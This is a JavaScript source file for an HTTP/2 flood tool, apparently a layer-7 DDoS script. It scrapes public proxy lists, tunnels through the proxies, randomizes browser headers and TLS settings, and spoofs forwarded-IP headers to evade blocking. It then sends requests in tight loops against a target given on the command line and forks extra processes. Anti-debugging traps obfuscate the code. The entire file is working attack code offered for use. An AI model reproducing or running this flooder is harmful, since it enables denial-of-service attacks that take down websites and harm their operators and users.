const { exec } = require('child_process')
require('events').EventEmitter.defaultMaxListeners = 0
process.setMaxListeners(0)
const fs = require('fs'),
  url = require('url'),
  http = require('http'),
  tls = require('tls'),
  crypto = require('crypto'),
  http2 = require('http2'),
  axios = require('axios')
console.clear()
console.log(
  '===================\nAttack was send to: ' +
    process.argv[2] +
    ' Time: ' +
    process.argv[3] +
    '\n==================='
)
function getArgs() {
  var _0x19878d = (function () {
      var _0x286ad6 = true
      return function (_0x4d6288, _0x5c0053) {
        var _0x285a13 = _0x286ad6
          ? function () {
              if (_0x5c0053) {
                var _0x5c5a5f = _0x5c0053.apply(_0x4d6288, arguments)
                return (_0x5c0053 = null), _0x5c5a5f
              }
            }
          : function () {}
        return (_0x286ad6 = false), _0x285a13
      }
    })(),
    _0x2a46eb = _0x19878d(this, function () {
      return _0x2a46eb
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(_0x2a46eb)
        .search('(((.+)+)+)+$')
    })
  _0x2a46eb()
  var _0x168d6f = (function () {
    var _0x4be511 = true
    return function (_0x4f71c1, _0x4f004f) {
      var _0x554895 = _0x4be511
        ? function () {
            if (_0x4f004f) {
              var _0x40f860 = _0x4f004f.apply(_0x4f71c1, arguments)
              return (_0x4f004f = null), _0x40f860
            }
          }
        : function () {}
      return (_0x4be511 = false), _0x554895
    }
  })()
  ;(function () {
    _0x168d6f(this, function () {
      var _0x160510 = new RegExp('function *\\( *\\)'),
        _0x19bbf8 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
        _0x58e1b8 = _0x241fec('init')
      if (
        !_0x160510.test(_0x58e1b8 + 'chain') ||
        !_0x19bbf8.test(_0x58e1b8 + 'input')
      ) {
        _0x58e1b8('0')
      } else {
        _0x241fec()
      }
    })()
  })()
  const _0x2246dc = {
    _0x3918db: _0xb9b846,
    _0x4255ca: true,
  }
  return (
    process.argv.slice(2, process.argv.length).forEach((_0x11870c) => {
      if (_0x11870c.slice(0, 2) === '--') {
        const _0x1dff54 = _0x11870c.split('=#'),
          _0x3918db = _0x1dff54[0].slice(2, _0x1dff54[0].length),
          _0xb9b846 = _0x1dff54.length > 1 ? _0x1dff54[1] : true
      } else {
        if (_0x11870c[0] === '-') {
          const _0x1f480b = _0x11870c.slice(1, _0x11870c.length).split('')
          _0x1f480b.forEach((_0x4255ca) => {})
        }
      }
    }),
    _0x2246dc
  )
}
const args = getArgs()
;(function () {
  var _0x2981e8 = function () {
      var _0x41c316
      try {
        _0x41c316 = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x49b740) {
        _0x41c316 = window
      }
      return _0x41c316
    },
    _0xbddc8d = _0x2981e8()
  _0xbddc8d.setInterval(_0x241fec, 4000)
})()
if (args.proxy_scrape != 'false') {
  var http_web_list = []
  args.proxy_apis_file != undefined
    ? (http_web_list = fs
        .readFileSync(args.proxy_apis_file, 'utf-8')
        .toString()
        .replace(/\r/g, '')
        .split('\n'))
    : (http_web_list = [
        'https://ciapak-proxy.cf/api/paid/?key=980321830129381029&type=http',
        'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous',
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
        'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
        'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
      ])
  var list = []
  ;(async () => {
    array = http_web_list
    var _0x689890 = 0
    for (let _0x186652 = 0; _0x186652 < array.length; _0x186652++) {
      const _0xb155f2 = array[_0x186652]
      _0x689890++
      try {
        var _0x13703f = await axios.get(_0xb155f2),
          _0x42f679 = _0x13703f.data.replace(/\r/g, '').split('\n')
        list = list.concat(_0x42f679)
      } catch (_0x206f2a) {}
    }
    var _0x570790 = new Set(list)
    proxy = [..._0x570790]
    var _0x5b9fe5 = fs.createWriteStream('http.txt')
    proxy.forEach((_0x2db2e6) => _0x5b9fe5.write(_0x2db2e6 + '\n'))
    _0x5b9fe5.end()
  })()
}
tls.DEFAULT_ECDH_CURVE
let payload = {}
try {
  var proxies = fs
    .readFileSync('http.txt', 'utf-8')
    .toString()
    .replace(/\r/g, '')
    .split('\n')
  var UAs_all = fs.readFileSync('UA/ua', 'utf-8').replace(/\r/g, '').split('\n')
  var UAs_android = fs
    .readFileSync('UA/Android', 'utf-8')
    .replace(/\r/g, '')
    .split('\n')
  var UAs_ios = fs
    .readFileSync('UA/iOS', 'utf-8')
    .replace(/\r/g, '')
    .split('\n')
  var UAs_linux = fs
    .readFileSync('UA/Linux', 'utf-8')
    .replace(/\r/g, '')
    .split('\n')
  var UAs_macos = fs
    .readFileSync('UA/macOS', 'utf-8')
    .replace(/\r/g, '')
    .split('\n')
  var UAs_windows = fs
    .readFileSync('UA/Windows', 'utf-8')
    .replace(/\r/g, '')
    .split('\n')
} catch (_0x91534f) {
  console.log(
    '===================\nSomething is wrong ? Check if you have all files from rar / zip etc\n==================='
  )
  process.exit()
}
function getRandomInt(_0x1c2d71, _0x567d0e) {
  _0x1c2d71 = Math.ceil(_0x1c2d71)
  return (
    (_0x567d0e = Math.floor(_0x567d0e)),
    Math.floor(Math.random() * (_0x567d0e - _0x1c2d71)) + _0x1c2d71
  )
}
var Generate_Encoding = [
    '*',
    'gzip, deflate',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    'gzip',
    'gzip, compress',
    'compress, deflate',
    'compress',
    'gzip, deflate, br',
    'deflate',
  ],
  Generate_Language = [
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'ja-JP',
    'en-GB',
    'en-AU',
    'en-CA',
    'en-NZ',
    'en-ZA',
    'en-IN',
    'en-PH',
    'en-SG',
    'en-ZA',
    'en-HK',
    'en-US',
    '*',
    'en-US,en;q=0.5',
    'utf-8, iso-8859-1;q=0.5, *;q=0.1',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-GB, en-US, en;q=0.9',
    'de-AT, de-DE;q=0.9, en;q=0.5',
  ],
  Generate_Cache = [
    'max-age=604800',
    's-maxage=604800',
    'no-cache',
    'max-age=0',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
  ],
  Generate_System = [
    'Android',
    'Chrome OS',
    'Chromium OS',
    'iOS',
    'Linux',
    'macOS',
    'Windows',
    'Unknown',
  ],
  Generate_Secua = [
    '"Chromium";v="100", "Google Chrome";v="100"',
    '"(Not(A:Brand";v="8", "Chromium";v="98"',
    '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
    '" Not A;Brand";v="99", "Chromium";v="96", "Microsoft Edge";v="96"',
    '"Opera";v="81", " Not;A Brand";v="99", "Chromium";v="95"',
  ],
  Generate_Secmode = ['cors', 'navigate', 'no-cors', 'same-origin', 'websocket']
var Generate_Accept = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  ],
  Generate_Secdest = ['document', 'empty', 'object', 'iframe', 'frame'],
  types = ['GET', 'POST', 'PATCH', 'DELETE', 'PUT'],
  g_accept,
  g_secmode,
  g_secua
var g_secdest,
  g_chmobile,
  g_system,
  g_cache,
  g_language,
  g_encoding,
  g_useragent
var g_method = 'GET'
function generaterequest() {
  var _0x263571 =
    Generate_System[Math.floor(Math.random() * Generate_System.length)]
  if (_0x263571.includes('Android')) {
    g_useragent = UAs_android[Math.floor(Math.random() * UAs_android.length)]
    g_accept =
      Generate_Accept[Math.floor(Math.random() * Generate_Accept.length)]
    g_system = _0x263571
    g_cache = Generate_Cache[Math.floor(Math.random() * Generate_Cache.length)]
    g_language =
      Generate_Language[Math.floor(Math.random() * Generate_Language.length)]
    g_encoding =
      Generate_Encoding[Math.floor(Math.random() * Generate_Encoding.length)]
    g_chmobile = '?1'
    g_secmode =
      Generate_Secmode[Math.floor(Math.random() * Generate_Secmode.length)]
    g_secdest =
      Generate_Secdest[Math.floor(Math.random() * Generate_Secdest.length)]
  } else {
    if (_0x263571.includes('iOS')) {
      g_useragent = UAs_ios[Math.floor(Math.random() * UAs_ios.length)]
      g_accept =
        Generate_Accept[Math.floor(Math.random() * Generate_Accept.length)]
      g_system = _0x263571
      g_cache =
        Generate_Cache[Math.floor(Math.random() * Generate_Cache.length)]
      g_language =
        Generate_Language[Math.floor(Math.random() * Generate_Language.length)]
      g_encoding =
        Generate_Encoding[Math.floor(Math.random() * Generate_Encoding.length)]
      g_chmobile = '?1'
      g_secmode =
        Generate_Secmode[Math.floor(Math.random() * Generate_Secmode.length)]
      g_secdest =
        Generate_Secdest[Math.floor(Math.random() * Generate_Secdest.length)]
    } else {
      if (_0x263571.includes('macOS')) {
        g_useragent = UAs_macos[Math.floor(Math.random() * UAs_macos.length)]
        g_accept =
          Generate_Accept[Math.floor(Math.random() * Generate_Accept.length)]
        g_system = _0x263571
        g_cache =
          Generate_Cache[Math.floor(Math.random() * Generate_Cache.length)]
        g_language =
          Generate_Language[
            Math.floor(Math.random() * Generate_Language.length)
          ]
        g_encoding =
          Generate_Encoding[
            Math.floor(Math.random() * Generate_Encoding.length)
          ]
        g_chmobile = '?0'
        g_secua =
          Generate_Secua[Math.floor(Math.random() * Generate_Secua.length)]
        g_secmode =
          Generate_Secmode[Math.floor(Math.random() * Generate_Secmode.length)]
        g_secdest =
          Generate_Secdest[Math.floor(Math.random() * Generate_Secdest.length)]
      } else {
        if (_0x263571.includes('Linux')) {
          g_useragent = UAs_linux[Math.floor(Math.random() * UAs_linux.length)]
          g_accept =
            Generate_Accept[Math.floor(Math.random() * Generate_Accept.length)]
          g_system = _0x263571
          g_cache =
            Generate_Cache[Math.floor(Math.random() * Generate_Cache.length)]
          g_language =
            Generate_Language[
              Math.floor(Math.random() * Generate_Language.length)
            ]
          g_encoding =
            Generate_Encoding[
              Math.floor(Math.random() * Generate_Encoding.length)
            ]
          g_chmobile = '?0'
          g_secua =
            Generate_Secua[Math.floor(Math.random() * Generate_Secua.length)]
          g_secmode =
            Generate_Secmode[
              Math.floor(Math.random() * Generate_Secmode.length)
            ]
          g_secdest =
            Generate_Secdest[
              Math.floor(Math.random() * Generate_Secdest.length)
            ]
        } else {
          if (_0x263571.includes('Windows')) {
            g_useragent =
              UAs_windows[Math.floor(Math.random() * UAs_windows.length)]
            g_accept =
              Generate_Accept[
                Math.floor(Math.random() * Generate_Accept.length)
              ]
            g_system = _0x263571
            g_cache =
              Generate_Cache[Math.floor(Math.random() * Generate_Cache.length)]
            g_language =
              Generate_Language[
                Math.floor(Math.random() * Generate_Language.length)
              ]
            g_encoding =
              Generate_Encoding[
                Math.floor(Math.random() * Generate_Encoding.length)
              ]
            g_chmobile = '?0'
            g_secua =
              Generate_Secua[Math.floor(Math.random() * Generate_Secua.length)]
            g_secmode =
              Generate_Secmode[
                Math.floor(Math.random() * Generate_Secmode.length)
              ]
            g_secdest =
              Generate_Secdest[
                Math.floor(Math.random() * Generate_Secdest.length)
              ]
          } else {
            if (_0x263571.includes('Unknown')) {
              g_useragent = UAs_all[Math.floor(Math.random() * UAs_all.length)]
              g_accept =
                Generate_Accept[
                  Math.floor(Math.random() * Generate_Accept.length)
                ]
              g_system = _0x263571
              g_cache =
                Generate_Cache[
                  Math.floor(Math.random() * Generate_Cache.length)
                ]
              g_language =
                Generate_Language[
                  Math.floor(Math.random() * Generate_Language.length)
                ]
              g_encoding =
                Generate_Encoding[
                  Math.floor(Math.random() * Generate_Encoding.length)
                ]
              g_chmobile = '?0'
              g_secua =
                Generate_Secua[
                  Math.floor(Math.random() * Generate_Secua.length)
                ]
              g_secmode =
                Generate_Secmode[
                  Math.floor(Math.random() * Generate_Secmode.length)
                ]
              g_secdest =
                Generate_Secdest[
                  Math.floor(Math.random() * Generate_Secdest.length)
                ]
            } else {
              g_useragent = UAs_all[Math.floor(Math.random() * UAs_all.length)]
              g_accept =
                Generate_Accept[
                  Math.floor(Math.random() * Generate_Accept.length)
                ]
              g_system = _0x263571
              g_cache =
                Generate_Cache[
                  Math.floor(Math.random() * Generate_Cache.length)
                ]
              g_language =
                Generate_Language[
                  Math.floor(Math.random() * Generate_Language.length)
                ]
              g_encoding =
                Generate_Encoding[
                  Math.floor(Math.random() * Generate_Encoding.length)
                ]
              g_chmobile = '?0'
              g_secua =
                Generate_Secua[
                  Math.floor(Math.random() * Generate_Secua.length)
                ]
              g_secmode =
                Generate_Secmode[
                  Math.floor(Math.random() * Generate_Secmode.length)
                ]
              g_secdest =
                Generate_Secdest[
                  Math.floor(Math.random() * Generate_Secdest.length)
                ]
            }
          }
        }
      }
    }
  }
}
var proxyxdd
function getRandomNumber(_0x5c2889, _0x16c90a) {
  return Math.floor(Math.random() * (_0x16c90a - _0x5c2889 + 1) + _0x5c2889)
}
try {
  var objetive = process.argv[2].replace('[_rand]', ''),
    parsed
} catch (_0x3f916a) {
  console.log("===================\nTarget wasn't given\n===================")
  process.exit()
}
const sigalgs = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512',
]
let SignalsList = sigalgs.join(':')
class TlsBuilder {
  constructor(_0x14ef02) {
    this.curve = 'GREASE:X25519:x25519'
    this.sigalgs = SignalsList
    this.Opt =
      crypto.constants.SSL_OP_NO_RENEGOTIATION |
      crypto.constants.SSL_OP_NO_TICKET |
      crypto.constants.SSL_OP_NO_SSLv2 |
      crypto.constants.SSL_OP_NO_SSLv3 |
      crypto.constants.SSL_OP_NO_COMPRESSION |
      crypto.constants.SSL_OP_NO_RENEGOTIATION |
      crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
      crypto.constants.SSL_OP_TLSEXT_PADDING |
      crypto.constants.SSL_OP_ALL |
      crypto.constants.SSLcom
  }
  ['http2TUNNEL'](_0xecc55b) {
    generaterequest()
    _0xecc55b.setKeepAlive(true, process.argv[3] * 1000)
    _0xecc55b.setTimeout(10000)
    payload[':method'] = g_method
    payload[':path'] = parsed.path
    payload.host = parsed.host
    payload.origin = objetive
    payload.accept = g_accept
    payload['accept-encoding'] = g_encoding
    payload['accept-language'] = g_language
    payload['cache-control'] = g_cache
    payload['user-agent'] = g_useragent
    payload['sec-ch-ua'] = g_secua
    payload['sec-ch-ua-mobile'] = g_chmobile
    payload['sec-fetch-site'] = 'same-origin'
    payload['sec-fetch-dest'] = g_secdest
    payload['sec-fetch-user'] = '?1'
    payload['sec-ch-ua-platform'] = g_system
    payload['sec-fetch-mode'] = g_secmode
    payload.referer = objetive
    g_method == 'POST' &&
      (payload.body = args.data_post.replace(
        /\[_rand\]/g,
        getRandomNumber(400000, 6000000000)
      ))
    if (args.cookie != undefined) {
      payload.cookie = args.cookie.replace(
        /\[_rand\]/g,
        getRandomNumber(400000, 6000000000)
      )
    }
    payload['upgrade-insecure-requests'] = 1
    const _0x471c06 = http2.connect(parsed.href, {
      createConnection: () =>
        tls.connect(
          {
            socket: _0xecc55b,
            ciphers:
              tls.getCiphers().join(':') +
              ':TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256' +
              ':HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:' +
              'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
            host: parsed.host,
            servername: parsed.host,
            secure: true,
            echdCurve: this.curve,
            honorCipherOrder: true,
            requestCert: true,
            secureOptions: this.Opt,
            sigalgs: this.sigalgs,
            rejectUnauthorized: false,
            ALPNProtocols: ['h2'],
          },
          () => {
            for (let _0x37b05e = 0; _0x37b05e < 12; _0x37b05e++) {
              setInterval(async () => {
                await _0x471c06.request(payload).close()
              })
            }
          }
        ),
    })
  }
}
class TlsBuilder2 {
  constructor(_0x2608bc) {
    this.curve = 'GREASE:X25519:x25519'
    this.sigalgs = SignalsList
    this.Opt =
      crypto.constants.SSL_OP_NO_RENEGOTIATION |
      crypto.constants.SSL_OP_NO_TICKET |
      crypto.constants.SSL_OP_NO_SSLv2 |
      crypto.constants.SSL_OP_NO_SSLv3 |
      crypto.constants.SSL_OP_NO_COMPRESSION |
      crypto.constants.SSL_OP_NO_RENEGOTIATION |
      crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
      crypto.constants.SSL_OP_TLSEXT_PADDING |
      crypto.constants.SSL_OP_ALL |
      crypto.constants.SSLcom
  }
  ['http2TUNNEL'](_0x34a86e) {
    generaterequest()
    _0x34a86e.setKeepAlive(true, process.argv[3] * 1000)
    _0x34a86e.setTimeout(10000)
    payload[':method'] = g_method
    payload[':path'] = parsed.path
    payload.host = parsed.host
    payload.origin = objetive
    payload.accept = g_accept
    payload['accept-encoding'] = g_encoding
    payload['accept-language'] = g_language
    payload['cache-control'] = g_cache
    payload['user-agent'] = g_useragent
    if (g_method == 'POST') {
      payload.body = args.data_post.replace(
        /\[_rand\]/g,
        getRandomNumber(400000, 6000000000)
      )
    }
    args.cookie != undefined &&
      (payload.cookie = args.cookie.replace(
        /\[_rand\]/g,
        getRandomNumber(400000, 6000000000)
      ))
    if (getRandomInt(1, 5) == 3) {
      payload.Via = '' + proxyxdd + ''
      payload['Client-IP'] = '' + proxyxdd + ''
      payload['X-Forwarded-For'] = '' + proxyxdd + ''
      payload['Real-IP'] = '' + proxyxdd + ''
      payload['X-Client-IP'] = '' + proxyxdd + ''
      payload['X-Real-IP'] = '' + proxyxdd + ''
      payload['True-Client-IP'] = '' + proxyxdd + ''
      payload['Fastly-Client-IP'] = '' + proxyxdd + ''
    }
    payload['upgrade-insecure-requests'] = 1
    const _0x43e9be = http2.connect(parsed.href, {
      createConnection: () =>
        tls.connect(
          {
            socket: _0x34a86e,
            ciphers:
              tls.getCiphers().join(':') +
              ':TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256' +
              ':HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:' +
              'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
            host: parsed.host,
            servername: parsed.host,
            secure: true,
            honorCipherOrder: true,
            requestCert: true,
            secureOptions: this.Opt,
            sigalgs: this.sigalgs,
            rejectUnauthorized: false,
            ALPNProtocols: ['h2'],
          },
          () => {
            for (let _0x4f878a = 0; _0x4f878a < 12; _0x4f878a++) {
              setInterval(async () => {
                await _0x43e9be.request(payload).close()
              })
            }
          }
        ),
    })
  }
}
var reqpersec = 64
args.rps != undefined && (reqpersec = args.rps)
BuildTLS = new TlsBuilder()
BuildTLS2 = new TlsBuilder2()
var _0x18d940 = {}
_0x18d940.keepAlive = true
_0x18d940.maxSockets = Infinity
_0x18d940.maxTotalSockets = Infinity
_0x18d940.maxSockets = Infinity
const keepAliveAgent = new http.Agent(_0x18d940)
function Runner() {
  for (let _0x140d80 = 0; _0x140d80 < reqpersec; _0x140d80++) {
    var _0x3adc34 = proxies[Math.floor(Math.random() * proxies.length)]
    _0x3adc34 = _0x3adc34.split(':')
    parsed = url.parse(
      process.argv[2].replace(/\[_rand\]/g, getRandomNumber(400000, 6000000000))
    )
    var _0xadbb38 = http.get({
      host: _0x3adc34[0],
      port: _0x3adc34[1],
      timeout: 10000,
      method: 'CONNECT',
      agent: keepAliveAgent,
      path: parsed.host + ':443',
    })
    _0xadbb38.end()
    _0xadbb38.on('connect', (_0x225b72, _0x315ad0) => {
      var _0xf09140 = getRandomInt(1, 3)
      if (args.method == 'RANDOM') {
        g_method = types[Math.floor(Math.random() * types.length)]
      } else {
        if (args.method != undefined) {
          g_method = args.method
        } else {
          g_method = 'GET'
        }
      }
      if (_0xf09140 == 1) {
        payload = {}
        BuildTLS2.http2TUNNEL(_0x315ad0)
      } else {
        payload = {}
        BuildTLS.http2TUNNEL(_0x315ad0)
      }
      proxyxdd = _0x3adc34[0]
    })
    _0xadbb38.on('end', () => {
      _0xadbb38.resume(), _0xadbb38.close()
    })
  }
}
setInterval(Runner)
if (args.threads != undefined) {
  var g = 0,
    f = args.threads
  while (f > g) {
    g = g + 1
    exec(
      process.argv.join(' ').replace('--threads=#', '--yy=#'),
      (_0x21232b, _0x38634f, _0x471fae) => {
        if (_0x21232b) {
          console.error('error: ' + _0x21232b.message)
          return
        }
      }
    )
  }
}
setTimeout(function () {
  console.log('===================\nAttack has ended!\n===================')
  process.exit()
}, process.argv[3] * 1000)
process.on('uncaughtException', function (_0x25fd64) {})
process.on('unhandledRejection', function (_0x3a8eb0) {})
function _0x241fec(_0x4370c5) {
  function _0x21bd79(_0x273393) {
    if (typeof _0x273393 === 'string') {
      return function (_0x2fa1b4) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      if (('' + _0x273393 / _0x273393).length !== 1 || _0x273393 % 20 === 0) {
        ;(function () {
          return true
        }
          .constructor('debugger')
          .call('action'))
      } else {
        ;(function () {
          return false
        }
          .constructor('debugger')
          .apply('stateObject'))
      }
    }
    _0x21bd79(++_0x273393)
  }
  try {
    if (_0x4370c5) {
      return _0x21bd79
    } else {
      _0x21bd79(0)
    }
  } catch (_0x247dfd) {}
}
